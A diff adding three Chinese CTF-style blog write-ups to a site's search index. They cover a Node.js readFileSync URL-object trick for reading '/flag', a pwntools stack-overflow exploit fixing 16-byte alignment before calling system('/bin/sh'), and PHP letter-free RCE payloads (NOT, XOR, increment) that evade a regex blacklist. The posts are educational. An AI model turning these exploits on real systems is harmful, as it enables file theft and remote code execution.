class="title function_">toString</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>一个过滤了关键词<strong>flag</strong>的任意文件读取。</p>
+<p>payload如下：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"> <span class="attr">&quot;file[href]&quot;</span><span class="punctuation">:</span><span class="string">&quot;a&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;file[origin]&quot;</span><span class="punctuation">:</span><span class="string">&quot;a&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;file[protocol]&quot;</span><span class="punctuation">:</span><span class="string">&quot;file:&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;file[pathname]&quot;</span><span class="punctuation">:</span><span class="string">&quot;/fl%61g&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;file[hostname]&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>通过下面的源码分析，我们将得知这个trick的精彩之处。</p>
+<p>首先从文档入手，粗略认识一下<code>fs.readFileSync</code>方法</p>
+<p><img src="/images/20220923230858.png"></p>
+<p>我们注意到<code>path</code>参数可以是一个<code>URL</code>对象，payload中的flag关键字似乎也是利用了url解码的方法进行绕过的。但显然我们无法直接输入一个<code>URL</code>对象，难道还有其它方法能构造出<code>URL</code>对象吗？</p>
+<p><img src="/images/20220924233442.png"></p>
+<p>顺着这个思路，我们开始一步步地跟进源码。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">readFileSync</span>(<span class="params">path, options</span>) &#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="keyword">const</span> isUserFd = <span class="title function_">isFd</span>(path); <span class="comment">// 判断是否为文件描述符</span></span><br><span class="line">  <span class="keyword">const</span> fd = isUserFd ? path : fs.<span class="title function_">openSync</span>(path, options.<span class="property">flag</span>, <span class="number">0o666</span>);</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>path</code>如果不是文件描述符的话，将调用<code>fs.openSync</code>。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">openSync</span>(<span class="params">path, flags, mode</span>) &#123;</span><br><span class="line">  path = <span class="title function_">getValidatedPath</span>(path);</span><br><span class="line">  <span class="keyword">const</span> flagsNumber = <span class="title function_">stringToFlags</span>(flags);</span><br><span class="line">  mode = <span class="title function_">parseFileMode</span>(mode, <span class="string">&#x27;mode&#x27;</span>, <span class="number">0o666</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> ctx = &#123; path &#125;;</span><br><span class="line">  <span class="keyword">const</span> result = binding.<span class="title function_">open</span>(pathModule.<span class="title function_">toNamespacedPath</span>(path),</span><br><span class="line">                              flagsNumber, mode,</span><br><span class="line">                              <span class="literal">undefined</span>, ctx);</span><br><span class="line">  <span class="title function_">handleErrorFromBinding</span>(ctx);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进<code>getValidatedPath</code>。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> getValidatedPath = <span class="title function_">hideStackFrames</span>(<span class="function">(<span class="params">fileURLOrPath, propName = <span class="string">&#x27;path&#x27;</span></span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> path = <span class="title function_">toPathIfFileURL</span>(fileURLOrPath);</span><br><span class="line">  <span class="title function_">validatePath</span>(path, propName);</span><br><span class="line">  <span class="keyword">return</span> path;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>跟进回调函数中的<code>toPathIfFileURL</code>。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">toPathIfFileURL</span>(<span class="params">fileURLOrPath</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_">isURLInstance</span>(fileURLOrPath))</span><br><span class="line">    <span class="keyword">return</span> fileURLOrPath;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">fileURLToPath</span>(fileURLOrPath);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进<code>isURLInstance</code>的真假判断</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">isURLInstance</span> = (<span class="params">input</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> input != <span class="literal">null</span> &amp;&amp; input.<span class="property">href</span> &amp;&amp; input.<span class="property">origin</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果参数对象存在<code>href</code>和<code>origin</code>属性将返回真，此时返回<code>fileURLToPath</code>。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fileURLToPath</span>(<span class="params">path</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> path === <span class="string">&#x27;string&#x27;</span>)</span><br><span class="line">    path = <span class="keyword">new</span> <span class="title function_">URL</span>(path);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="title function_">isURLInstance</span>(path))</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_">ERR_INVALID_ARG_TYPE</span>(<span class="string">&#x27;path&#x27;</span>, [<span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;URL&#x27;</span>], path);</span><br><span class="line">  <span class="keyword">if</span> (path.<span class="property">protocol</span> !== <span class="string">&#x27;file:&#x27;</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_">ERR_INVALID_URL_SCHEME</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> isWindows ? <span class="title function_">getPathFromURLWin32</span>(path) : <span class="title function_">getPathFromURLPosix</span>(path);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>fileURLToPath</code>函数内部终于出现了<code>new URL</code>，好耶</p>
+<p>第一个<code>if</code>要求参数对象属性必须得是字符串类型才给我们<code>new</code>，好在这个要求无伤大雅。</p>
+<p>此时它要求我们的<code>protocol</code>属性为<code>file:</code>，否则将会抛出一个错误。</p>
+<p>接下来判断运行系统是否为Windows系统，在环境是Linux的情况下，跟进<code>getPathFromURLPosix</code></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getPathFromURLPosix</span>(<span class="params">url</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (url.<span class="property">hostname</span> !== <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_">ERR_INVALID_FILE_URL_HOST</span>(platform);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> pathname = url.<span class="property">pathname</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> n = <span class="number">0</span>; n &lt; pathname.<span class="property">length</span>; n++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (pathname[n] === <span class="string">&#x27;%&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> third = pathname.<span class="title function_">codePointAt</span>(n + <span class="number">2</span>) | <span class="number">0x20</span>;</span><br><span class="line">      <span class="keyword">if</span> (pathname[n + <span class="number">1</span>] === <span class="string">&#x27;2&#x27;</span> &amp;&amp; third === <span class="number">102</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_">ERR_INVALID_FILE_URL_PATH</span>(</span><br><span class="line">          <span class="string">&#x27;must not include encoded / characters&#x27;</span></span><br><span class="line">        );</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(pathname);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果参数对象的<code>hostname</code>属性不为空的话将再次抛出一个错误，因此我们需要构造一个空的<code>hostname</code>属性，好让函数继续进行下去。</p>
+<p>而剩下的代码和<code>decodeURIComponent</code>就是在帮我们以url解码的方式转换<code>pathname</code>属性了。</p>
+<p><img src="/images/20220925001928.png"></p>
+<p>本地验证大成功。</p>
+<p>这个trick真的很有意思，因为它看似简单，但需要深入源码分析才能明白它的原理。</p>
+]]></content>
+      <tags>
+        <tag>node.js</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>栈平衡详解</title>
+    <url>/2022/10/07/stack_balance/</url>
+    <content><![CDATA[<p>绕过了强而有力的保护，结果卡在栈平衡，痛失三血，怒写笔记。鉴定为菜。</p>
+<span id="more"></span>
+
+<h1><span id="概念">概念</span></h1><blockquote>
+<p>函数如果要返回父程序，则在堆栈中进行操作的时候，一定要在RET指令之前，将ESP指向函数入栈前的地址。</p>
+<p>每调用一个CALL，就会开辟一个新的栈空间，如果没有栈平衡功能的实现，那么很容易会破坏其它栈里的数据，导致程序崩溃。</p>
+<p>在Ubuntu18以上环境的64位程序，当调用<code>printf</code>或是<code>system</code>时，需要保证RSP &amp; 0xf == 0，即16字节对齐，最后4比特为0。当不满足上述条件的时候就报错。</p>
+</blockquote>
+<h1><span id="示例">示例</span></h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以一个简单的栈溢出程序为例，在<code>Ubuntu 18.04</code>系统上进行64位编译</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&gt; gcc exp.c -o exp -no-pie -fno-stack-protector</span><br></pre></td></tr></table></figure>
+
+<p>为了方便演示关闭了PIE保护和canary。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&gt; checksec --file=exp     </span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   64 Symbols	  No	0		1		exp</span><br></pre></td></tr></table></figure>
+
+<p>搓个人畜无害的exp，attach上gdb进行动态调试</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">p = process(<span class="string">&#x27;./exp&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">128</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x400571</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/20221006230718.png"></p>
+<p>可以看到溢出利用是成功的，至此一切正常。继续单步跳过</p>
+<p><img src="/images/20221006231052.png"></p>
+<p>步入<code>system</code>调用后，整个程序就寄在了MOVAPS指令<sup>[1]</sup>，同时抛出错误</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Program received signal SIGSEGV, Segmentation fault。</span><br></pre></td></tr></table></figure>
+
+<p>因为MOVAPS指令要求目标操作数是内存操作数时对齐16字节边界，如果没对齐会就会出现分段错误。</p>
+<blockquote>
+<p>When the source or destination operand is a memory operand, the operand must be aligned on a 16-byte (128-bit version), 32-byte (VEX.256 encoded version) or 64-byte (EVEX.512 encoded version) boundary or a general-protection exception (#GP) will be generated. </p>
+</blockquote>
+<p>回头看现在栈上的情况</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rsp   0x7fff001f9818 -&gt; 0x7fff001f9b30 &lt;- 0x0</span><br></pre></td></tr></table></figure>
+
+<p>此时RSP寄存器的值是0x7fff001f9818，并没有对齐16字节，即强行跳转后门函数破坏了栈平衡，需要完善栈溢出的操作。</p>
+<p>一种常见的解决方法是在调用后门函数之前塞个RET指令</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">128</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x40054b</span>) + p64(<span class="number">0x400571</span>)</span><br></pre></td></tr></table></figure>
+
+<p>RET指令可以看作等效于POP EIP（实际上没有这个指令<sup>[2]</sup>），也即先弹出栈顶的数据（RSP+8），之后再压栈，将RSP的值对齐16字节完成栈平衡。否则会因为此处意★义★不★明的PUSH造成函数入栈后RSP的值-8。</p>
+<p><img src="/images/20221007230240.png"></p>
+<p>可以看到RSP的值在PUSH后变回了为0x7ffd49459a20。</p>
+<p><img src="/images/20221007232057.png"></p>
+<p>单步跟进到MOVAPS指令，此时RSP寄存器的值为0x7ffd49459680，对齐16字节。</p>
+<p><img src="/images/20221007233355.png"></p>
+<p>本地成功打通。</p>
+<p><img src="/images/20221007233711.png"></p>
+<p>而难以定位RET指令的时候（如开启了PIE保护），既然此处的思想是用POP抵消掉PUSH来保证栈平衡，我们不妨做得更绝一点，要是直接舍弃意★义★不★明的PUSH呢？</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">128</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x400572</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/20221007234640.png"></p>
+<p>可以看到仍然保证了栈平衡。本地成功打通。</p>
+<p><img src="/images/20221007235102.png"></p>
+<h1><span id="外部链接">外部链接</span></h1><p>[1] <a href="https://www.felixcloutier.com/x86/movaps">Move Aligned Packed Single-Precision Floating-Point Values</a></p>
+<p>[2] <a href="https://stackoverflow.com/questions/56676840/is-pop-eip-legal-instruction">Is pop eip legal instruction?</a></p>
+]]></content>
+      <tags>
+        <tag>pwn-stackbalance</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>无字母数字RCE初探</title>
+    <url>/2022/03/28/rce_without_w_and_n/</url>
+    <content><![CDATA[<p>没有blacklist的rce是没有灵魂的！</p>
+<span id="more"></span>
+
+<p>有人说，说是有人在blacklist里下了毒（指<code>/[a-zA-Z0-9]+/</code></p>
+<p>害羞羞，你看你就会开玩笑（指绕过</p>
+<p>本地写个青春版</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br></pre></td></tr></table></figure>
+
+<h1><span id="取反">取反</span></h1><p>按位取反，入坑以来最先接触到的姿势，温故而知新。</p>
+<p>举个栗子</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">233</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(~<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># int(-234)</span></span><br></pre></td></tr></table></figure>
+
+<p><code>233</code>的二进制值为<code>0000 0000 1110 1001</code></p>
+<p>按位取反得<code>1111 1111 0001 0110</code>，即<code>-234</code>。</p>
+<p>ps：我们可能更熟悉长成<code>1000 0000 1110 1010</code>的<code>-234</code>，其实它们是等价的，只是表示方法不同。前者是补码形式，后者是原码形式，最高位都为符号位。关于<a href="https://www.cnblogs.com/ydqblogs/p/13823206.html">原码，反码，补码</a></p>
+<p>那么对于字母而言，我们也就能通过其他字符加上取反操作得到我们想到的组合了。</p>
+<p>大部分情况下都会加上<code>urlencode()</code>，出现乱码总是很老火的说</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment"># string(21) &quot;%8F%97%8F%96%91%99%90&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>最终payload为<code>(%8F%97%8F%96%91%99%90)();</code>。</p>
+<p>相信不止我一个人在刚接触这种姿势时认为，将<code>phpinfo();</code>这完整的函数进行取反不是能减少一些操作嘛，为什么要单独取反函数名再加上括号和分号呢？</p>
+<p>让我们把这段代码再回下锅</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br></pre></td></tr></table></figure>
+
+<p><code>eval()</code>首先执行的操作是取反<code>~</code>，而取反后的最终结果只会是单纯的字符串。得出<code>phpinfo</code>后，如果再加上外部的括号，得到的实际上是<code>(&#39;phpinfo&#39;)()</code>，经过<code>eval()</code>的解析，在php7及以上版本中这种写法会被认为是函数，因此会执行后续的payload。分号作为一句完整代码的结束标志，就和平时写代码一样。</p>
+<p>我们将括号分号一齐加入取反的队伍，取反后得到了<code>phpinfo();</code>，看似没有多大差别，但我们要知道，这是一串字符串，只是一串字符串。<code>eval()</code>对单纯的字符串又有什么坏心思呢？于是就没有后续了。（悲</p>
+<p>试着写了个很挫的脚本 学习为主 轻喷（demo版 后面会继续升级的 这还不够智能 瘫</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwn($func1 [, $func2] [, $param])</span></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&#x27;var_dump&#x27;</span>, <span class="string">&#x27;ini_get&#x27;</span>, <span class="string">&#x27;disable_functions&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$func1</span>, <span class="variable">$func2</span>=<span class="string">&#x27;&#x27;</span>, <span class="variable">$param</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$negat_func1</span> = ~<span class="variable">$func1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$param</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$func2</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)();&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$negat_func2</span> = ~<span class="variable">$func2</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)((~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func2</span>).<span class="string">&#x27;)());&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$negat_param</span> = ~<span class="variable">$param</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$func2</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)((~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_param</span>).<span class="string">&#x27;));&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$negat_func2</span> = ~<span class="variable">$func2</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)((~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func2</span>).<span class="string">&#x27;)((~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_param</span>).<span class="string">&#x27;)));&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1><span id="异或">异或</span></h1><p>万恶之源 我很异或（疑惑）的出处</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span>^<span class="number">1</span>;  <span class="comment"># 0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span>^<span class="number">0</span>;  <span class="comment"># 1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">0</span>^<span class="number">0</span>;  <span class="comment"># 0</span></span><br></pre></td></tr></table></figure>
+
+<p>在php中两个字符串异或之后，得到的还是一个字符串。基于此我们也能做到无字母数字构造payload。</p>
+<p>选择异或的理由？同或不行吗？当然可以!</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;a&#x27;</span>|<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>; <span class="comment"># c</span></span><br></pre></td></tr></table></figure>
+
+<p>不过异或运算的一大特点是<strong>运算可逆</strong>，异或字符和被异或字符运算的结果能倒着异或回去得到相同的结果，相对同或来说，这为我们寻找payload提供了莫大的便利。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;a&#x27;</span>^<span class="string">&#x27;!&#x27;</span>; <span class="comment"># @</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;@&#x27;</span>^<span class="string">&#x27;!&#x27;</span>; <span class="comment"># a</span></span><br></pre></td></tr></table></figure>
+
+<p>（脚本绝赞升级中）</p>
+<h1><span id="自增">自增</span></h1><p>php的字符自增和C的ASCII值自增有很大不同。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;z&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> ++<span class="variable">$a</span>; <span class="comment"># aa</span></span><br><span class="line"><span class="keyword">echo</span> ++<span class="variable">$a</span>; <span class="comment"># ab</span></span><br></pre></td></tr></table></figure>
+
+<p>同时我们要注意字符变量只能递增，不能递减，且只支持纯字母（a-z 和 A-Z），递增或递减其他字符变量是没有用的哦。</p>
+<p>基于此特性，我们要想获得小写字母，就要从<code>a</code>开始自增，要想获得大写字母，就从<code>A</code>开始。</p>
+<p>同时，在php中如果强制连接数组和字符串，会发生强制类型转换，数组将被转为字符串，且值为<code>Array</code>。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = [];</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.<span class="variable">$b</span>; <span class="comment"># Array</span></span><br></pre></td></tr></table></figure>
+
+<p>好巧不巧，这<code>Array</code>里不仅有<code>A</code>还有<code>a</code>，再配合自增，我们就能构造出任意英文字母了。</p>
+<p>自搓脚本 梅开二度（指很拉的构造 太弱小了 没有力量</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$__</span> = [].<span class="string">&#x27;&#x27;</span>;          <span class="comment"># $__ = &#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$__</span>[<span class="string">&#x27;!&#x27;</span> == <span class="string">&#x27;?&#x27;</span>]; <span class="comment"># $_ = $__[0];</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$_</span>;            <span class="comment"># A</span></span><br><span class="line">++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$____</span> = ++<span class="variable">$_</span>;         <span class="comment"># E</span></span><br><span class="line">++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_____</span> = ++<span class="variable">$_</span>;        <span class="comment"># O</span></span><br><span class="line"><span class="variable">$______</span> = ++<span class="variable">$_</span>;       <span class="comment"># P</span></span><br><span class="line">++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_______</span> = ++<span class="variable">$_</span>;      <span class="comment"># R</span></span><br><span class="line"><span class="variable">$________</span> = ++<span class="variable">$_</span>;     <span class="comment"># S</span></span><br><span class="line"><span class="variable">$_________</span> = ++<span class="variable">$_</span>;    <span class="comment"># T</span></span><br><span class="line">++<span class="variable">$_</span>;</span><br><span class="line"></span><br><span class="line">(<span class="variable">$___</span>.<span class="variable">$________</span>.<span class="variable">$________</span>.<span class="variable">$____</span>.<span class="variable">$_______</span>.<span class="variable">$_________</span>)(<span class="string">&#x27;$_&#x27;</span>.<span class="variable">$______</span>.<span class="variable">$_____</span>.<span class="variable">$________</span>.<span class="variable">$_________</span>.<span class="string">&#x27;[_];&#x27;</span>);</span><br><span class="line"><span class="comment"># (&#x27;ASSERT&#x27;)(&#x27;$_POST[_];&#x27;);</span></span><br></pre></td></tr></table></figure>
+
+<p>看着熟悉的<code>eval()</code>消失在payload里，心态逐渐发生了一些微妙的变化</p>
+<p>事实上，<code>assert()</code>的构造在php7中和<code>eval()</code>一样，也变成了一种语言结构而不是一个函数，这导致此类payload在php7及以上版本环境中全部无效。</p>
+<p><a href="https://www.anquanke.com/post/id/173201">浅谈eval和assert</a>对此做了一些补充说明。</p>
+<p>真搞事还得是<code>system()</code>啊（确信</p>
+<p>又由于自增类型的payload太长，非常容易被长度限制，因此命令执行还是用取反或者异或叭。</p>
+]]></content>
+      <tags>
+        <tag>php-rce</tag>
       </tags>
   </entry>
 </search>
